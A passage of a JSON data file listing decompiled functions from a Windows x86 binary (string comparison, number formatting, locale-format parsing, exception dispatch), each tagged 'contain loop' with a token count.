        "decompiled_code": "\nvoid __fastcall fcn.0040939c(uint param_1, char *param_2)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint8_t uVar3;\n    char *in_EAX;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    char *pcVar7;\n    bool bVar8;\n    \n    uVar6 = 0xffffffff;\n    uVar4 = 0;\n    pcVar7 = param_2;\n    do {\n        if (uVar6 == 0) break;\n        uVar6 = uVar6 - 1;\n        cVar2 = *pcVar7;\n        pcVar7 = pcVar7 + 1;\n    } while (cVar2 != '\\0');\n    uVar6 = ~uVar6;\n    bVar8 = true;\ncode_r0x004093b1:\n    do {\n        if (uVar6 != 0) {\n            uVar6 = uVar6 - 1;\n            pcVar1 = param_2 + 1;\n            pcVar7 = in_EAX + 1;\n            bVar8 = *in_EAX == *param_2;\n            in_EAX = pcVar7;\n            param_2 = pcVar1;\n            if (bVar8) goto code_r0x004093b1;\n        }\n        if (bVar8) {\n            return;\n        }\n        uVar3 = in_EAX[-1];\n        uVar5 = uVar4 & 0xffffff00 | uVar3;\n        if ((0x60 < uVar3) && (uVar3 < 0x7b)) {\n            uVar5 = uVar4 & 0xffffff00 | uVar3 - 0x20;\n        }\n        uVar3 = param_2[-1];\n        uVar4 = uVar3;\n        if ((0x60 < uVar3) && (uVar3 < 0x7b)) {\n            uVar4 = uVar3 - 0x20;\n        }\n        uVar4 = uVar5 - uVar4;\n        bVar8 = uVar4 == 0;\n        if (!bVar8) {\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 499
    },
    "004093dc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004093dc(int32_t param_1, char *param_2)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint8_t uVar3;\n    char *in_EAX;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    bool bVar8;\n    \n    uVar4 = 0;\n    iVar6 = param_1;\n    pcVar7 = param_2;\n    if (param_1 != 0) {\n        do {\n            if (iVar6 == 0) break;\n            iVar6 = iVar6 + -1;\n            cVar2 = *pcVar7;\n            pcVar7 = pcVar7 + 1;\n        } while (cVar2 != '\\0');\n        param_1 = param_1 - iVar6;\n        bVar8 = true;\ncode_r0x004093f5:\n        do {\n            if (param_1 != 0) {\n                param_1 = param_1 + -1;\n                pcVar1 = param_2 + 1;\n                pcVar7 = in_EAX + 1;\n                bVar8 = *in_EAX == *param_2;\n                in_EAX = pcVar7;\n                param_2 = pcVar1;\n                if (bVar8) goto code_r0x004093f5;\n            }\n            if (bVar8) {\n                return;\n            }\n            uVar3 = in_EAX[-1];\n            uVar5 = uVar4 & 0xffffff00 | uVar3;\n            if ((0x60 < uVar3) && (uVar3 < 0x7b)) {\n                uVar5 = uVar4 & 0xffffff00 | uVar3 - 0x20;\n            }\n            uVar3 = param_2[-1];\n            uVar4 = uVar3;\n            if ((0x60 < uVar3) && (uVar3 < 0x7b)) {\n                uVar4 = uVar3 - 0x20;\n            }\n            uVar4 = uVar5 - uVar4;\n            bVar8 = uVar4 == 0;\n        } while (bVar8);\n    }\n    return;\n}\n",
        "token_count": 502
    },
    "00409420": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00409420(uint param_1, char param_2)\n\n{\n    char *in_EAX;\n    char *pcStack4;\n    \n    pcStack4 = in_EAX;\n    do {\n        if (param_2 == *pcStack4) {\ncode_r0x0040943b:\n            return CONCAT44(pcStack4, pcStack4);\n        }\n        if (*pcStack4 == '\\0') {\n            pcStack4 = NULL;\n            goto code_r0x0040943b;\n        }\n        pcStack4 = pcStack4 + 1;\n    } while( true );\n}\n",
        "token_count": 134
    },
    "00409440": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar * __fastcall fcn.00409440(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    char *in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    char *pcVar8;\n    bool bVar9;\n    \n    if ((in_EAX != NULL) && (param_2 != NULL)) {\n        uVar2 = 0xffffffff;\n        pcVar7 = param_2;\n        do {\n            if (uVar2 == 0) break;\n            uVar2 = uVar2 - 1;\n            cVar1 = *pcVar7;\n            pcVar7 = pcVar7 + 1;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar2 - 1;\n        if (uVar3 != 0) {\n            uVar4 = 0xffffffff;\n            pcVar7 = in_EAX;\n            do {\n                if (uVar4 == 0) break;\n                uVar4 = uVar4 - 1;\n                cVar1 = *pcVar7;\n                pcVar7 = pcVar7 + 1;\n            } while (cVar1 != '\\0');\n            iVar5 = ~uVar4 - uVar3;\n            bVar9 = iVar5 == 0;\n            if (uVar3 <= ~uVar4 && !bVar9) {\n                do {\n                    pcVar7 = param_2 + 1;\n                    pcVar8 = in_EAX;\n                    do {\n                        in_EAX = pcVar8;\n                        if (iVar5 == 0) break;\n                        iVar5 = iVar5 + -1;\n                        in_EAX = pcVar8 + 1;\n                        bVar9 = *param_2 == *pcVar8;\n                        pcVar8 = in_EAX;\n                    } while (!bVar9);\n                    iVar6 = ~uVar2 - 2;\n                    pcVar8 = in_EAX;\n                    if (!bVar9) {\n                        return NULL;\n                    }\n                    do {\n                        if (iVar6 == 0) break;\n                        bVar9 = *pcVar7 == *pcVar8;\n                        iVar6 = iVar6 + -1;\n                        pcVar8 = pcVar8 + 1;\n                        pcVar7 = pcVar7 + 1;\n                    } while (bVar9);\n                    if (bVar9) {\n                        return in_EAX + -1;\n                    }\n                } while( true );\n            }\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 578
    },
    "004096b2": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004096b2(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint64_t *puVar3;\n    char cVar4;\n    int16_t iVar6;\n    uint32_t uVar7;\n    uint extraout_ECX;\n    unkbyte3 Var8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    int32_t unaff_EBP;\n    uint8_t *puVar11;\n    float10 fVar12;\n    float10 fVar13;\n    float10 fVar14;\n    uint var_69h;\n    uint var_59h;\n    uint var_49h;\n    uint var_28h;\n    uint var_24h;\n    uint var_18h;\n    uint var_ch;\n    uint var_4h;\n    char cVar5;\n    \n    iVar9 = *(unaff_EBP + -0xc);\n    if (iVar9 <= *(unaff_EBP + 8)) {\n        *(unaff_EBP + -0xc) = *(unaff_EBP + -0xc) + 1;\n    // WARNING: Could not recover jumptable at 0x004096d2. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x4096d9\n        (**(*(*(unaff_EBP + 0xc) + iVar9 * 8 + 4) * 4 + 0x4096d9))();\n        return;\n    }\n    do {\n        fcn.004098df();\n        puVar3 = fcn.00409500();\n        uVar10 = *(unaff_EBP + -0x24);\n        if (0x20 < uVar10) {\n            uVar10 = 0;\n        }\n        cVar5 = extraout_ECX;\n        Var8 = extraout_ECX >> 8;\n        cVar4 = cVar5 + -0x44;\n        if (cVar4 == '\\0') break;\n        cVar4 = '\\x10';\n        Var8 = 0;\n        if (cVar5 == 'X') break;\n        cVar4 = '\\n';\n        Var8 = 0;\n    } while (cVar5 != 'U');\n    iVar6 = CONCAT31(Var8, cVar4);\n    if ((cVar4 == '\\0') && (iVar6 = 10,  (*(puVar3 + 4) & 0x80000000) != 0)) {\n        fcn.00408c7c(-*puVar3, -(*(puVar3 + 4) + (*puVar3 != 0)));\n        *(unaff_EBP + -0x4a) = 0x2d;\n        return;\n    }\n    if ((*(puVar3 + 4) & 0x80000000) == 0) {\n        fVar14 = *puVar3;\n    }\n    else {\n        fVar14 = 0x7fffffffffffffff + 1 + (*puVar3 & 0x7fffffffffffffff);\n    }\n    fVar12 = iVar6;\n    puVar11 = unaff_EBP + -0x49;\n    do {\n        puVar11 = puVar11 + -1;\n        fVar13 = fVar14 - (fVar14 / fVar12) * fVar12;\n        fVar14 = fVar14 / fVar12;\n        var_4h._0_1_ = ROUND(fVar13);\n        uVar2 = var_4h + 0x30;\n        if (0x39 < uVar2) {\n            uVar2 = var_4h + 0x37;\n        }\n        *puVar11 = uVar2;\n    } while (1 <= fVar14);\n    uVar7 = (unaff_EBP + -0x49) - puVar11;\n    iVar9 = uVar10 - uVar7;\n    if (uVar7 <= uVar10 && iVar9 != 0) {\n        iVar1 = -iVar9;\n        while (iVar9 = iVar9 + -1,  iVar9 != 0) {\n            (puVar11 + iVar1)[iVar9] = 0x30;\n        }\n        puVar11[iVar1] = 0x30;\n    }\n    return;\n}\n",
        "token_count": 985
    },
    "0040a363": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040a363(void)\n\n{\n    char cVar1;\n    char *unaff_ESI;\n    \n    do {\n        cVar1 = *unaff_ESI;\n        if (cVar1 == '\\0') {\n            return;\n        }\n        unaff_ESI = unaff_ESI + 1;\n    } while (cVar1 == ' ');\n    return;\n}\n",
        "token_count": 85
    },
    "0040b70c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040b70c(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *param_2;\n    while( true ) {\n        iVar1 = fcn.00404888();\n        if ((iVar1 < iVar2) || (*(in_EAX + -1 + iVar2) != ' ')) break;\n        iVar2 = iVar2 + 1;\n    }\n    *param_2 = iVar2;\n    return;\n}\n",
        "token_count": 127
    },
    "0040b888": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0040b888(void)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 1;\n    while( true ) {\n        iVar2 = fcn.00404888();\n        if (iVar2 < iVar3) {\n            return 0;\n        }\n        uVar1 = *(in_EAX + -1 + iVar3) & 0xdf;\n        if (uVar1 == 0x44) {\n            return 1;\n        }\n        if (uVar1 == 0x45) {\n            return 2;\n        }\n        if (uVar1 == 0x4d) break;\n        if (uVar1 == 0x59) {\n            return 2;\n        }\n        iVar3 = iVar3 + 1;\n    }\n    return 0;\n}\n",
        "token_count": 198
    },
    "0040c418": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040c418(void)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack20;\n    uint uStack16;\n    uint var_8h;\n    int32_t iStack8;\n    \n    puStack40 = &stack0xfffffffc;\n    iStack8 = 0;\n    var_8h = 0;\n    uStack16 = 0;\n    uStack20 = 0;\n    uStack44 = 0x40c5e2;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack48;\n    iVar5 = 1;\n    fcn.004045c8();\n    arg_8h = &var_8h;\n    sub.kernel32.dll_GetThreadLocale_1();\n    fcn.0040c0e0(arg_8h);\n    iVar3 = fcn.00408da0();\n    if (iVar3 - 3U < 3) {\n        while (iVar3 = fcn.00404888(),  iVar5 <= iVar3) {\n            uVar4 = *(in_EAX + -1 + iVar5);\n            if ((*((uVar4 >> 3) + 0x483110) >> (uVar4 & 7) & 1) == 0) {\n                iVar3 = fcn.004093dc();\n                if (iVar3 == 0) {\n                    fcn.00404890();\n                    iVar5 = iVar5 + 1;\n                }\n                else {\n                    iVar3 = fcn.004093dc();\n                    if (iVar3 == 0) {\n                        fcn.00404890();\n                        iVar5 = iVar5 + 3;\n                    }\n                    else {\n                        iVar3 = fcn.004093dc();\n                        if (iVar3 == 0) {\n                            fcn.00404890();\n                            iVar5 = iVar5 + 1;\n                        }\n                        else {\n                            cVar1 = *(in_EAX + -1 + iVar5);\n                            if ((cVar1 == 'Y') || (cVar1 == 'y')) {\n                                fcn.00404890();\n                            }\n                            else {\n                                fcn.004047b0();\n                                fcn.00404890();\n                            }\n                        }\n                    }\n                }\n                iVar5 = iVar5 + 1;\n            }\n            else {\n                iStack8 = fcn.0040d528();\n                arg_8h = &uStack20;\n                fcn.00404ae8();\n                fcn.00404890();\n                iVar5 = iVar5 + iStack8;\n            }\n        }\n    }\n    else {\n        if ((*0x485748 == 4) || (*0x485748 - 0x11U < 2)) {\n            bVar2 = true;\n        }\n        else {\n            bVar2 = false;\n        }\n        if (bVar2) {\n            for (; iVar3 = fcn.00404888(),  iVar5 <= iVar3; iVar5 = iVar5 + 1) {\n                cVar1 = *(in_EAX + -1 + iVar5);\n                if ((cVar1 != 'G') && (cVar1 != 'g')) {\n                    fcn.004047b0();\n                    fcn.00404890();\n                }\n            }\n        }\n        else {\n            fcn.0040461c();\n        }\n    }\n    *in_FS_OFFSET = arg_8h;\n    uStack44 = 0x40c5e9;\n    iStack48 = 0x40c5e1;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 847
    },
    "0040febc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040febc(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uchar *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = &stack0xfffffffc;\n    iVar1 = 8;\n    do {\n        var_4h = 0;\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    var_14h = 0x410101;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0040febc::var_18h;\n    if (in_EAX < -0x7ffdfff5) {\n        if (in_EAX == -0x7ffdfff6) {\n            var_1ch = 0x40ff92;\n            var_10h = &stack0xfffffffc;\n            fcn.0040675c();\n            var_1ch = 0x40ffa1;\n            fcn.0040c8dc();\n            var_1ch = 0x40ffa6;\n            fcn.00403fc0();\n            goto code_r0x004100d9;\n        }\n        if (in_EAX < -0x7ffdfffa) {\n            if (in_EAX == -0x7ffdfffb) {\n                var_1ch = 0x40ff50;\n                var_10h = &stack0xfffffffc;\n                fcn.0040fc34();\n                goto code_r0x004100d9;\n            }\n            if (in_EAX == -0x7fffbfff) {\n                var_1ch = 0x410004;\n                var_10h = &stack0xfffffffc;\n                fcn.0040675c();\n                var_1ch = 0x410013;\n                fcn.0040c8dc();\n                var_1ch = 0x410018;\n                fcn.00403fc0();\n                goto code_r0x004100d9;\n            }\n            if (in_EAX == -0x7fff0001) {\n                var_1ch = 0x410073;\n                var_10h = &stack0xfffffffc;\n                fcn.0040675c();\n                var_1ch = 0x410082;\n                fcn.0040c8dc();\n                var_1ch = 0x410087;\n                fcn.00403fc0();\n                goto code_r0x004100d9;\n            }\n        }\n        else {\n            if (in_EAX == -0x7ffdfff8) {\n                var_1ch = 0x40ff62;\n                var_10h = &stack0xfffffffc;\n                fcn.0040675c();\n                var_1ch = 0x40ff71;\n                fcn.0040c8dc();\n                var_1ch = 0x40ff76;\n                fcn.00403fc0();\n                goto code_r0x004100d9;\n            }\n            if (in_EAX == -0x7ffdfff7) {\n                var_1ch = 0x40ff80;\n                var_10h = &stack0xfffffffc;\n                fcn.0040fd24();\n                goto code_r0x004100d9;\n            }\n        }\n    }\n    else {\n        if (in_EAX == -0x7ffdfff5) {\n            var_1ch = 0x40ffb8;\n            fcn.0040675c();\n            var_1ch = 0x40ffc7;\n            fcn.0040c8dc();\n            var_1ch = 0x40ffcc;\n            fcn.00403fc0();\n            goto code_r0x004100d9;\n        }\n        if (in_EAX == -0x7ffdfff3) {\n            var_1ch = 0x40ffde;\n            var_10h = &stack0xfffffffc;\n            fcn.0040675c();\n            var_1ch = 0x40ffed;\n            fcn.0040c8dc();\n            var_1ch = 0x40fff2;\n            fcn.00403fc0();\n            goto code_r0x004100d9;\n        }\n        if (in_EAX == -0x7ff8fff2) {\n            var_1ch = 0x41002a;\n            var_10h = &stack0xfffffffc;\n            fcn.0040675c();\n            var_1ch = 0x410039;\n            fcn.0040c8dc();\n            var_1ch = 0x41003e;\n            fcn.00403fc0();\n            goto code_r0x004100d9;\n        }\n        if (in_EAX == -0x7ff8ffa9) {\n            var_1ch = 0x410050;\n            var_10h = &stack0xfffffffc;\n            fcn.0040675c();\n            var_1ch = 0x41005f;\n            fcn.0040c8dc();\n            var_1ch = 0x410064;\n            fcn.00403fc0();\n            goto code_r0x004100d9;\n        }\n    }\n    var_38h = **0x4847c0;\n    var_34h._0_1_ = 0xb;\n    var_2ch._0_1_ = 0;\n    var_1ch = 0x4100a8;\n    var_10h = &stack0xfffffffc;\n    fcn.0040c094();\n    var_1ch = &fcn.0040febc::var_38h;\n    var_20h = 2;\n    var_24h = 0x4100c5;\n    fcn.0040675c();\n    var_24h = 0x4100d4;\n    fcn.0040c918(var_20h, var_1ch);\n    var_24h = 0x4100d9;\n    fcn.00403fc0();\ncode_r0x004100d9:\n    *in_FS_OFFSET = var_20h;\n    var_18h = 0x410108;\n    var_1ch = 0x4100f3;\n    fcn.004045ec();\n    var_1ch = 0x410100;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 1575
    },
    "00415a70": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.00415a70(void)\n\n{\n    int16_t *in_EAX;\n    int16_t *piStack4;\n    \n    for (piStack4 = in_EAX; *piStack4 == 0x400c; piStack4 = *(piStack4 + 4)) {\n    }\n    return CONCAT44(piStack4, piStack4);\n}\n",
        "token_count": 81
    },
    "00415c58": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00415c58(uint *param_1, uint16_t *param_2)\n\n{\n    uint16_t uVar1;\n    uint16_t *in_EAX;\n    uint32_t uVar2;\n    uint32_t unaff_EBX;\n    bool bVar3;\n    \n    uVar1 = *in_EAX;\n    if (uVar1 == 0x400c) {\n        uVar2 = fcn.00415c58();\n    }\n    else {\n        *param_2 = uVar1;\n        bVar3 = (*(param_2 + 1) & 0x20) != 0;\n        uVar2 = unaff_EBX & 0xffff0000 | uVar1 & 0xffffff00 | bVar3;\n        if (bVar3) {\n            if ((*(param_2 + 1) & 0x40) == 0) {\n                *param_1 = *(in_EAX + 4);\n            }\n            else {\n                *param_1 = **(in_EAX + 4);\n            }\n        }\n        else {\n            *param_1 = 0;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 264
    },
    "00415f74": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00415f74(uint arg_8h)\n\n{\n    uint in_EAX;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint unaff_EBX;\n    int32_t arg_10h;\n    \n    arg_10h = in_ECX + 1;\n    if (arg_10h != 0 && SCARRY4(in_ECX, 1) == arg_10h < 0) {\n        do {\n            unaff_EBX = *(in_EDX + in_ECX * 4);\n            in_ECX = in_ECX + -1;\n        } while (-1 < in_ECX);\n    }\n    fcn.00415ea8(arg_8h, in_EAX, arg_10h, unaff_EBX);\n    return;\n}\n",
        "token_count": 177
    },
    "004160e0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004160e0(int32_t arg_8h)\n\n{\n    uint in_EAX;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    int32_t iVar1;\n    \n    iVar1 = arg_8h;\n    if (-1 < arg_8h) {\n        do {\n            unaff_EBX = *(in_ECX + iVar1 * 4);\n            iVar1 = iVar1 + -1;\n        } while (-1 < iVar1);\n    }\n    fcn.00415f98(in_EAX, in_EDX, arg_8h + 1, unaff_EBX);\n    return;\n}\n",
        "token_count": 149
    },
    "00418474": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00418474(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint8_t *puVar4;\n    \n    if (param_2 != 0) {\n        iVar2 = **(in_EAX + 0xb + *(in_EAX + 1));\n        uVar3 = *(iVar2 + 1);\n        puVar4 = iVar2 + 0xf + uVar3;\n        piVar1 = iVar2 + 7 + uVar3;\n        iVar2 = 0;\n        do {\n            uVar3 = uVar3 & 0xffffff00 | *puVar4;\n            if (uVar3 == *(param_2 + -4)) {\n                while (((*((uVar3 - 1) + param_2) ^ puVar4[uVar3]) & 0xdf) == 0) {\n                    uVar3 = uVar3 - 1;\n                    if (uVar3 == 0) {\n                        return iVar2;\n                    }\n                }\n                uVar3 = uVar3 & 0xffffff00 | *puVar4;\n            }\n            iVar2 = iVar2 + 1;\n            puVar4 = puVar4 + uVar3 + 1;\n        } while (iVar2 <= *piVar1);\n    }\n    return -1;\n}\n",
        "token_count": 321
    },
    "00418524": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00418524(uint param_1, uchar *param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint8_t uVar4;\n    uchar *puVar3;\n    uchar *puVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    \n    if (in_EAX != 0) {\n        puVar3 = param_2;\n        if (param_2 != NULL) {\n            puVar3 = CONCAT11(*param_2, param_2[-4]) & 0xdfff;\n        }\n        while( true ) {\n            iVar1 = in_EAX + 2 + *(in_EAX + 1);\n            uVar6 = *(iVar1 + 10);\n            uVar7 = *(iVar1 + 0xb + uVar6);\n            if (uVar7 != 0) {\n                iVar2 = iVar1 + 0xd + uVar6;\n                do {\n                    puVar5 = uVar6 & 0xffff0000 | *(iVar2 + 0x1a) & 0xffffdfff;\n                    if (puVar5 == puVar3) {\n                        uVar6 = uVar6 & 0xffff0000 | *(iVar2 + 0x1a) & 0xffff00ff;\n                        while( true ) {\n                            uVar4 = param_2[uVar6 - 1] ^ *(iVar2 + 0x1a + uVar6);\n                            if ((uVar4 & 0xdf) != 0) break;\n                            uVar6 = uVar6 - 1;\n                            puVar3 = puVar3 & 0xffff0000 | CONCAT11(uVar4, puVar3);\n                            if (uVar6 == 0) {\n                                return;\n                            }\n                        }\n                        puVar3 = puVar3 & 0xffff0000 | CONCAT11(*param_2, puVar3) & 0xffffdfff;\n                        puVar5 = uVar6 & 0xffffff00 | *(iVar2 + 0x1a);\n                    }\n                    uVar6 = puVar5 & 0xffff00ff;\n                    uVar7 = uVar7 - 1;\n                    iVar2 = iVar2 + 0x1b + uVar6;\n                } while (uVar7 != 0);\n            }\n            if (*(iVar1 + 4) == NULL) break;\n            in_EAX = **(iVar1 + 4);\n        }\n    }\n    return;\n}\n",
        "token_count": 557
    },
    "0041b32c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0041b32c(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    iVar3 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar3 + -1) {\n        do {\n            uVar2 = fcn.0041c4c8();\n            cVar1 = fcn.00403784();\n            if (cVar1 != '\\0') goto code_r0x0041b383;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    iVar3 = (**(**(in_EAX + 8) + 0x54))();\n    if (iVar3 < 0) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = (**(**(in_EAX + 8) + 0x18))();\n    }\ncode_r0x0041b383:\n    return CONCAT44(param_2, uVar2);\n}\n",
        "token_count": 242
    },
    "0041b38c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong __fastcall fcn.0041b38c(uint param_1)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uStack20;\n    \n    uStack20._1_3_ = param_1 >> 8;\n    uStack20 = CONCAT31(uStack20._1_3_, 1);\n    uVar1 = *(in_EAX + 0xc);\n    iVar2 = *(uVar1 + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.0041c4c8();\n            uVar1 = fcn.00403a58();\n            if (uVar1 != '\\0') goto code_r0x0041b3c6;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    uStack20 = uStack20._1_3_ << 8;\ncode_r0x0041b3c6:\n    return CONCAT44(uStack20, uVar1 & 0xffffff00 | uStack20 & 0xff);\n}\n",
        "token_count": 256
    },
    "0041b554": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041b554(uint param_1, int32_t param_2)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if (*(in_EAX + 0x20) != param_2) {\n        *(in_EAX + 0x20) = param_2;\n        iVar3 = *(*(in_EAX + 4) + 8);\n        if (-1 < iVar3 + -1) {\n            do {\n                iVar2 = fcn.0041c4c8();\n                uVar1 = fcn.0041b38c();\n                *(iVar2 + 0x10) = uVar1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 190
    },
    "0041b670": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0041b670(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    uVar2 = 0;\n    iVar1 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.0041c4c8();\n            uVar2 = fcn.0041b200(param_2);\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return CONCAT44(param_2, uVar2);\n}\n",
        "token_count": 146
    },
    "0041b874": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong __fastcall fcn.0041b874(uint param_1)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uStack20;\n    \n    uStack20._1_3_ = param_1 >> 8;\n    uStack20 = CONCAT31(uStack20._1_3_, 1);\n    uVar1 = *(in_EAX + 4);\n    iVar2 = *(uVar1 + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.0041c4c8();\n            uVar1 = fcn.0041b478();\n            if (uVar1 != '\\0') goto code_r0x0041b8ac;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    uStack20 = uStack20._1_3_ << 8;\ncode_r0x0041b8ac:\n    return CONCAT44(uStack20, uVar1 & 0xffffff00 | uStack20 & 0xff);\n}\n",
        "token_count": 252
    },
    "0041b8b8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041b8b8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.0041c4c8();\n            iVar1 = fcn.0041c52c();\n            if (-1 < iVar1) {\n                return;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.0041b270();\n    fcn.0041c358();\n    return;\n}\n",
        "token_count": 151
    },
    "0041bc34": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041bc34(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    \n    puStack12 = 0x41bc44;\n    fcn.0041b850();\n    uStack16 = 0x41bc99;\n    uStack20 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffec;\n    puStack12 = &stack0xfffffffc;\n    while( true ) {\n        cVar1 = fcn.0041b874();\n        if (cVar1 != '\\0') break;\n        fcn.0041b85c();\n        if (in_EAX == *0x419ed8) break;\n        in_EAX = fcn.004037ac();\n    }\n    *in_FS_OFFSET = uStack20;\n    puStack12 = 0x41bca0;\n    uStack16 = 0x41bc98;\n    fcn.0041b908();\n    return;\n}\n",
        "token_count": 238
    },
    "0041c140": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041c140(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    iVar1 = fcn.004069e0();\n    iVar1 = *(*(iVar1 + 8) + 8);\n    if (-1 < iVar1 + -1) {\n        do {\n            piVar2 = fcn.0041c4c8();\n            (**(*piVar2 + 0xc))();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 125
    },
    "0041c52c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041c52c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    for (iVar1 = 0; (iVar1 < *(in_EAX + 8) && (param_2 != *(*(in_EAX + 4) + iVar1 * 4))); iVar1 = iVar1 + 1) {\n    }\n    if (iVar1 == *(in_EAX + 8)) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 128
    },
    "0041c6e4": {
        "rules": [
            "contain loop"
        ],
